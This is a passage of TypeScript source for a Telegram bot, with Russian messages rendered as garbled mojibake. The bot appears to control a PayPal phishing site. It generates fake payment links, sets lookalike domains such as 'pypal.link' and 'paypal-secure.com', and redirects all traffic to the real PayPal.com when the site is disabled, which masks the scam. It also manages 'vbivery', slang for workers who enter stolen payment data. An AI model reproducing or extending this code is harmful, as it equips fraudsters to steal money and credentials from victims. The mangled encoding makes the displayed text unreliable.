      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  if (!newDomain) {
    await bot.sendMessage(
      chatId,
      "–£–∫–∞–∂–∏—Ç–µ –Ω–æ–≤—ã–π –¥–æ–º–µ–Ω –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã.\n–ü—Ä–∏–º–µ—Ä: /edit_domain pypal.link",
    );
    return;
  }

  // Validate domain format
  const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9]*\.([a-zA-Z]{2,})$/;
  if (!domainRegex.test(newDomain)) {
    await bot.sendMessage(
      chatId,
      "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–æ–º–µ–Ω–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: domain.com",
    );
    return;
  }

  try {
    const fs = await import('fs');
    const path = await import('path');
    const configPath = path.join(process.cwd(), 'domain.config');
    
    console.log(`üîç Telegram bot: Attempting to write "${newDomain}" to ${configPath}`);
    console.log(`üîç Current working directory: ${process.cwd()}`);
    
    // Check if file exists and is writable
    try {
      const stats = fs.statSync(configPath);
      console.log(`üìÑ File exists, size: ${stats.size} bytes, writable: ${(stats.mode & 0o200) !== 0}`);
    } catch (e) {
      console.log(`üìÑ File doesn't exist, will create new one`);
    }
    
    // Perform the write operation
    fs.writeFileSync(configPath, newDomain, 'utf8');
    console.log(`üåç Telegram bot: Domain updated to ${newDomain} in domain.config`);
    
    // Verify the write was successful
    const readBack = fs.readFileSync(configPath, 'utf8').trim();
    console.log(`üîç Verification: File now contains "${readBack}"`);
    
    if (readBack === newDomain) {
      console.log('‚úÖ Write verification successful');
      await bot.sendMessage(
        chatId,
        `üåç –î–û–ú–ï–ù –ò–ó–ú–ï–ù–ï–ù!\n\n` +
          `üì± –ù–æ–≤—ã–π –¥–æ–º–µ–Ω: ${newDomain}\n` +
          `üìÑ –§–∞–π–ª domain.config –æ–±–Ω–æ–≤–ª–µ–Ω\n` +
          `üîó –í—Å–µ –Ω–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–æ–≤—ã–π –¥–æ–º–µ–Ω\n\n` +
          `‚úÖ –ò–∑–º–µ–Ω–µ–Ω–∏—è –ø—Ä–∏–º–µ–Ω–µ–Ω—ã –º–≥–Ω–æ–≤–µ–Ω–Ω–æ!`,
        adminKeyboard,
      );
    } else {
      console.log('‚ùå Write verification failed');
      await bot.sendMessage(chatId, "–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∑–∞–ø–∏—Å–∏ –≤ domain.config.");
    }
    
  } catch (error) {
    console.error('‚ùå Telegram bot: Failed to update domain.config:', error);
    console.error('‚ùå Error details:', {
      message: error.message,
      code: error.code,
      syscall: error.syscall,
      path: error.path,
      errno: error.errno
    });
    await bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ domain.config: ${error.message}`);
  }
});

// Admin command to delete all links
bot.onText(/\/delete_all_links/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  try {
    const result = await db.delete(telegramLinks);
    await bot.sendMessage(
      chatId,
      `üóëÔ∏è –í—Å–µ —Å—Å—ã–ª–∫–∏ —É–¥–∞–ª–µ–Ω—ã!\n\n` +
        `–¢–µ–ø–µ—Ä—å –≤—Å–µ —Å—Å—ã–ª–∫–∏ –±—É–¥—É—Ç –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å –Ω–∞ paypal.com`,
      adminKeyboard,
    );
  } catch (error) {
    console.error("Error deleting all links:", error);
    await bot.sendMessage(chatId, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Å—Å—ã–ª–æ–∫.");
  }
});

// Handle text messages
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const text = msg.text;

  if (!text || text.startsWith("/")) return;
  
  console.log(`üì® Message received - telegramId: ${telegramId}, text: ${text}`);

  // Development mode - all functions enabled for testing
  const isDevelopment = process.env.NODE_ENV === "development";
  // if (isDevelopment && text !== "üîç –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã") {
  //   await bot.sendMessage(
  //     chatId,
  //     "üö´ –ë–æ—Ç –æ—Ç–∫–ª—é—á–µ–Ω –≤ —Ä–µ–∂–∏–º–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏. –í—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–æ—Å—Ç—É–ø–Ω—ã —Ç–æ–ª—å–∫–æ –≤ Production.",
  //   );
  //   return;
  // }

  // Check if user is approved
  if (!(await isUserApproved(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –¥–æ—Å—Ç—É–ø–∞.",
    );
    return;
  }

  // Check if bot is enabled (except for admin)
  if (!BOT_ENABLED && !(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "üö´ –ë–æ—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–∫–ª—é—á–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.");
    return;
  }

  const userState = userStates.get(telegramId);
  console.log(`üîÑ User state for ${telegramId}:`, userState);

  // Handle cancel
  if (text === "‚ùå –û—Ç–º–µ–Ω–∞") {
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, "–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.", mainKeyboard);
    return;
  }

  // Handle main menu buttons
  if (text === "üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É") {
    userStates.set(telegramId, { state: "awaiting_price" });
    await bot.sendMessage(
      chatId,
      "üí∞ –í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É (–Ω–∞–ø—Ä–∏–º–µ—Ä: 10 –∏–ª–∏ 10.50):",
      cancelKeyboard,
    );
    return;
  }

  if (text === "üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏") {
    await showUserLinks(chatId, telegramId);
    return;
  }

  if (text === "üë§ –ü—Ä–æ—Ñ–∏–ª—å") {
    await showUserProfile(chatId, telegramId);
    return;
  }

  // Admin-only buttons
  if (await isUserAdmin(telegramId)) {
    if (text === "‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–æ–º") {
      const status = BOT_ENABLED ? "–≤–∫–ª—é—á–µ–Ω ‚úÖ" : "–æ—Ç–∫–ª—é—á–µ–Ω ‚ùå";
      await bot.sendMessage(
        chatId,
        `ü§ñ –°—Ç–∞—Ç—É—Å –±–æ—Ç–∞: ${status}\n\n` +
          `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—ã:\n` +
          `/disable_bot - –æ—Ç–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n` +
          `/enable_bot - –≤–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π`,
        (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
      );
      return;
    }

    if (text === "üåê –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∞–π—Ç–æ–º") {
      try {
        const response = await fetch("http://localhost:5000/api/site/status");
        const data = await response.json();
        const siteStatus = data.enabled ? "–≤–∫–ª—é—á–µ–Ω ‚úÖ" : "–æ—Ç–∫–ª—é—á–µ–Ω ‚ùå";

        await bot.sendMessage(
          chatId,
          `üåê –°—Ç–∞—Ç—É—Å —Å–∞–π—Ç–∞: ${siteStatus}\n\n` +
            `${
              data.enabled
                ? "‚úÖ –°–∞–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ\nüîó –í—Å–µ —Å—Å—ã–ª–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ã\nüì± –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É —Ä–∞–±–æ—Ç–∞–µ—Ç"
                : "üö´ –°–∞–π—Ç –æ—Ç–∫–ª—é—á–µ–Ω\nüîÑ –í—Å–µ —Å—Å—ã–ª–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ PayPal.com\nüì± –í–∫–ª—é—á–∞—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É"
            }\n\n` +
            `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—ã:\n` +
            `/disable_site - –æ—Ç–∫–ª—é—á–∏—Ç—å –≤–µ—Å—å —Å–∞–π—Ç\n` +
            `/enable_site - –≤–∫–ª—é—á–∏—Ç—å —Å–∞–π—Ç`,
          adminKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–∞—Ç—É—Å–∞ —Å–∞–π—Ç–∞.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "üåç –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–æ–º–µ–Ω–æ–º") {
      try {
        const currentDomain = getDomainFromConfig();
        
        await bot.sendMessage(
          chatId,
          `üåç –¢–µ–∫—É—â–∏–π –¥–æ–º–µ–Ω: ${currentDomain}\n\n` +
            `üìÑ –î–æ–º–µ–Ω —É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ —Ñ–∞–π–ª domain.config\n\n` +
            `–î–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –¥–æ–º–µ–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É:\n` +
            `/edit_domain –Ω–æ–≤—ã–π-–¥–æ–º–µ–Ω.com\n\n` +
            `–ü—Ä–∏–º–µ—Ä—ã:\n` +
            `/edit_domain pypal.link\n` +
            `/edit_domain paypal-secure.com\n` +
            `/edit_domain my-domain.net\n\n` +
            `üí° –ò–ª–∏ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª domain.config –≤—Ä—É—á–Ω—É—é`,
          adminKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–æ–º–µ–Ω–µ.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "üì¢ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è") {
      userStates.set(telegramId, { state: "awaiting_broadcast_message" });
      await bot.sendMessage(
        chatId,
        "–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –±–æ—Ç–∞:",
        cancelKeyboard,
      );
      return;
    }

    if (text === "üîÑ –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è") {
      try {
        const response = await fetch(
          `http://localhost:5000/api/redirect/status`,
        );
        const data = await response.json();
        const redirectStatus = data.permanentRedirect
          ? "–í–∫–ª—é—á–µ–Ω–∞ ‚úÖ"
          : "–û—Ç–∫–ª—é—á–µ–Ω–∞ ‚ùå";

        const inlineKeyboard = {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: data.permanentRedirect
                    ? "‚ùå –û—Ç–∫–ª—é—á–∏—Ç—å –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—é"
                    : "‚úÖ –í–∫–ª—é—á–∏—Ç—å –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—é",
                  callback_data: data.permanentRedirect
                    ? "disable_redirect"
                    : "enable_redirect",
                },
              ],
            ],
          },
        };

        await bot.sendMessage(
          chatId,
          `üîÑ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–µ–π:\n\n` +
            `üìä –¢–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å: ${redirectStatus}\n\n` +
            `${
              data.permanentRedirect
                ? "üî¥ –í–°–ï –∑–∞–ø—Ä–æ—Å—ã –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ PayPal.com"
                : "üü¢ –°–∞–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –æ–±—ã—á–Ω–æ–º —Ä–µ–∂–∏–º–µ"
            }\n\n` +
            `‚ÑπÔ∏è –ü—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ–∏–∫ –±—É–¥–µ—Ç –Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –Ω–∞ PayPal, –≤–∫–ª—é—á–∞—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É.`,
          inlineKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "üîç –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã") {
      const envMode = process.env.NODE_ENV || "development";
      const isDevelopment = envMode === "development";
      const botStatus = isDevelopment
        ? "Development (–æ—Ç–∫–ª—é—á–µ–Ω)"
        : "Production (–∞–∫—Ç–∏–≤–µ–Ω)";
      const currentDomain = await getCurrentDomain();
      const domain = isDevelopment ? "localhost:5000" : currentDomain;

      // –ü–æ–ª—É—á–∞–µ–º —Å—Ç–∞—Ç—É—Å —Å–∞–π—Ç–∞
      let siteStatus = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
      let redirectStatus = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
      try {
        const siteResponse = await fetch(
          `http://localhost:5000/api/site/status`,
        );
        const siteData = await siteResponse.json();
        siteStatus = siteData.enabled ? "–í–∫–ª—é—á–µ–Ω ‚úÖ" : "–û—Ç–∫–ª—é—á–µ–Ω ‚ùå";

        const redirectResponse = await fetch(
          `http://localhost:5000/api/redirect/status`,
        );
        const redirectData = await redirectResponse.json();
        redirectStatus = redirectData.permanentRedirect
          ? "–í–∫–ª—é—á–µ–Ω–∞ ‚úÖ"
          : "–û—Ç–∫–ª—é—á–µ–Ω–∞ ‚ùå";
      } catch (error) {
        siteStatus = "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞";
      }

      await bot.sendMessage(
        chatId,
        `üîç –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã:\n\n` +
          `ü§ñ –†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã: ${envMode}\n` +
          `üì° Telegram –±–æ—Ç: ${botStatus}\n` +
          `üåê –î–æ–º–µ–Ω: ${domain}\n` +
          `üìä –°—Ç–∞—Ç—É—Å —Å–∞–π—Ç–∞: ${siteStatus}\n` +
          `üîÑ –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è: ${redirectStatus}\n` +
          `üîó –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å—Å—ã–ª–æ–∫: ${isDevelopment ? "–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞" : "–ê–∫—Ç–∏–≤–Ω–∞"}\n` +
          `üì¨ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: ${isDevelopment ? "–û—Ç–∫–ª—é—á–µ–Ω—ã" : "–í–∫–ª—é—á–µ–Ω—ã"}\n\n` +
          `${
            isDevelopment
              ? "‚ö†Ô∏è –í —Ä–µ–∂–∏–º–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞"
              : "‚úÖ –ü–æ–ª–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω–∞"
          }`,
        adminKeyboard,
      );
      return;
    }

    if (text === "üóëÔ∏è –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏") {
      await bot.sendMessage(
        chatId,
        "‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å –í–°–ï —Å—Å—ã–ª–∫–∏ —É –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π?\n\n" +
          "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /delete_all_links –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.",
        (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
      );
      return;
    }

    if (text === "üë• –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–±–∏–≤–µ—Ä–∞–º–∏") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.");
        return;
      }

      const workers = await getAllWorkers();
      const workersList = workers.length > 0 ? workers.map(w => `‚Ä¢ ${w}`).join('\n') : "–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –≤–±–∏–≤–µ—Ä–æ–≤";
      
      await bot.sendMessage(
        chatId,
        `üë• **–£–ü–†–ê–í–õ–ï–ù–ò–ï –í–ë–ò–í–ï–†–ê–ú–ò**\n\n` +
        `üìä –ê–∫—Ç–∏–≤–Ω—ã–µ –≤–±–∏–≤–µ—Ä—ã:\n${workersList}\n\n` +
        `‚öôÔ∏è –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n` +
        `‚Ä¢ /addworker [telegram_id] - –î–æ–±–∞–≤–∏—Ç—å –≤–±–∏–≤–µ—Ä–∞\n` +
        `‚Ä¢ /removeworker [telegram_id] - –£–±—Ä–∞—Ç—å –≤–±–∏–≤–µ—Ä–∞\n` +
        `‚Ä¢ /assignworker [worker_id] [user_id] - –ù–∞–∑–Ω–∞—á–∏—Ç—å –≤–±–∏–≤–µ—Ä–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é\n` +
        `‚Ä¢ /unassignworker [worker_id] [user_id] - –û—Ç–º–µ–Ω–∏—Ç—å –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ\n` +
        `‚Ä¢ /listassignments - –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è\n` +
        `‚Ä¢ /workerstats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Ä–∞–±–æ—Ç—ã –≤–±–∏–≤–µ—Ä–æ–≤`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  if (text === "‚ùì –ü–æ–º–æ—â—å") {
    const helpText = (await isUserAdmin(telegramId))
      ? `ü§ñ –ü–æ–º–æ—â—å –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –±–æ—Ç–∞:\n\n` +
        `üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É - —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å—Å—ã–ª–∫–∏\n` +
        `üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏ - –ø—Ä–æ—Å–º–æ—Ç—Ä –∏ —É–¥–∞–ª–µ–Ω–∏–µ —Å—Å—ã–ª–æ–∫\n` +
        `‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–æ–º - –≤–∫–ª—é—á–µ–Ω–∏–µ/–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞\n` +
        `üåê –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∞–π—Ç–æ–º - –ø–æ–ª–Ω–æ–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ/–≤–∫–ª—é—á–µ–Ω–∏–µ —Å–∞–π—Ç–∞\n` +
        `üîÑ –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è - –ø–æ—Å—Ç–æ—è–Ω–Ω–∞—è –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è –Ω–∞ PayPal.com\n` +
        `üë• –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–±–∏–≤–µ—Ä–∞–º–∏ - –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –≤–±–∏–≤–µ—Ä–æ–≤\n` +
        `üì¢ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è - –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º\n` +
        `üîç –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã - –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∂–∏–º–∞ —Ä–∞–±–æ—Ç—ã –∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã\n` +
        `üóëÔ∏è –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏ - —É–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Å—Å—ã–ª–æ–∫ —É –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n` +
        `‚ùì –ü–æ–º–æ—â—å - —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ\n\n` +
        `–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n` +
        `/approve #ID - –æ–¥–æ–±—Ä–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n` +
        `/disable_bot - –æ—Ç–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞\n` +
        `/enable_bot - –≤–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞\n` +
        `/disable_site - –æ—Ç–∫–ª—é—á–∏—Ç—å –≤–µ—Å—å —Å–∞–π—Ç (–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ PayPal)\n` +
        `/enable_site - –≤–∫–ª—é—á–∏—Ç—å —Å–∞–π—Ç\n` +
        `/edit_domain –¥–æ–º–µ–Ω.com - –∏–∑–º–µ–Ω–∏—Ç—å –¥–æ–º–µ–Ω –≤ —Ñ–∞–π–ª–µ domain.config\n` +
        `/delete_all_links - —É–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏\n\n` +
        `üë• –ö–æ–º–∞–Ω–¥—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤–±–∏–≤–µ—Ä–∞–º–∏:\n` +
        `/addworker [telegram_id] - –¥–æ–±–∞–≤–∏—Ç—å –≤–±–∏–≤–µ—Ä–∞\n` +
        `/removeworker [telegram_id] - —É–±—Ä–∞—Ç—å –≤–±–∏–≤–µ—Ä–∞\n` +
        `/assignworker [worker_id] [user_id] - –Ω–∞–∑–Ω–∞—á–∏—Ç—å –≤–±–∏–≤–µ—Ä–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é\n` +
        `/unassignworker [worker_id] [user_id] - –æ—Ç–º–µ–Ω–∏—Ç—å –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ\n` +
        `/listassignments - –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è\n` +
        `/workerstats - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Ä–∞–±–æ—Ç—ã –≤–±–∏–≤–µ—Ä–æ–≤`
      : `ü§ñ –ü–æ–º–æ—â—å –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –±–æ—Ç–∞:\n\n` +
        `üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É - —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å—Å—ã–ª–∫–∏\n` +
        `üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏ - –ø—Ä–æ—Å–º–æ—Ç—Ä –∏ —É–¥–∞–ª–µ–Ω–∏–µ —Å—Å—ã–ª–æ–∫\n` +
        `‚ùì –ü–æ–º–æ—â—å - —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ\n\n` +
        `–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –∏ –∏–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è.\n` +
        `–ë–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –¥–ª—è –ø–ª–∞—Ç–µ–∂–∞.`;

    await bot.sendMessage(
      chatId,
      helpText,
      (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
    );
    return;
  }

  if (text === "üë§ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏") {
    if (!(await isUserAdmin(telegramId))) {
      await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.");
      return;
    }

    await showUserManagement(chatId, telegramId);
    return;
  }

  // Handle conversation states
  if (userState) {
    await handleUserState(chatId, telegramId, text, userState);
  } else {
    await bot.sendMessage(
      chatId,
      "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –º–µ–Ω—é –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏.",
      mainKeyboard,
    );
  }
});

// Broadcast message to all approved users
async function broadcastMessage(message: string) {
  try {
    const allApprovedUsers = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.isApproved, true));

    for (const user of allApprovedUsers) {
      try {
        await bot.sendMessage(user.telegramId, `‚ÄºÔ∏è INFO:\n\n${message}`);
      } catch (error) {
        console.error(
          `Failed to send broadcast to user ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error broadcasting message:", error);
  }
}

// Handle user conversation states
async function handleUserState(
  chatId: number,
  telegramId: string,
  text: string,
  userState: any,
) {
  try {
    const stateAction = userState.state || userState.action;
    switch (stateAction) {
      case "awaiting_price":
        // Validate price
        const price = parseFloat(text.replace(",", "."));
        if (isNaN(price) || price <= 0) {
          await bot.sendMessage(
            chatId,
